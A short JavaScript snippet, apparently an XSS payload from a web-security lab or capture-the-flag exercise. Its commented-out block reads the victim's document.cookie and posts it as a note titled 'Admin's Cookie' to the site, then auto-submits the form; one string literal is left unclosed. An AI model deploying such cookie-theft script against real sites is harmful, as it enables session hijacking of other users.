// Move to Note Making Page
const navBarElements = document.getElementsByClassName("nav-item");
const newButton = navBarElements[2];
for (const child of newButton.children) {
  console.log(child.textContent);
}

// // Submitting Form Data
// const form = document.forms[0]
// form.addEventListener(
//   "submit",
//   (event) => {
    
//     const output = document.querySelector("output");
//     const data = new FormData(form);
//     const currentCookies = document.cookie;
    
//     data.append("title", "Admin's Cookie);
//     data.append("content", currentCookies);
    
//     const request = new XMLHttpRequest();
//     request.open("POST", "view/1", true);
//     request.onload = (progress) => {
//       output.innerHTML = (request.status === 200 ? "Form Submitted" : `Error: Something Went Wrong`);
//     };
    
//     request.send(data);
//     event.preventDefault();
//   },
//   false
// );

// // Input Exploited Data into Form Fields
// document.getElementById("title").click();
// document.getElementById("content").click();

// // Submit
// document.getElementById("submit").click();



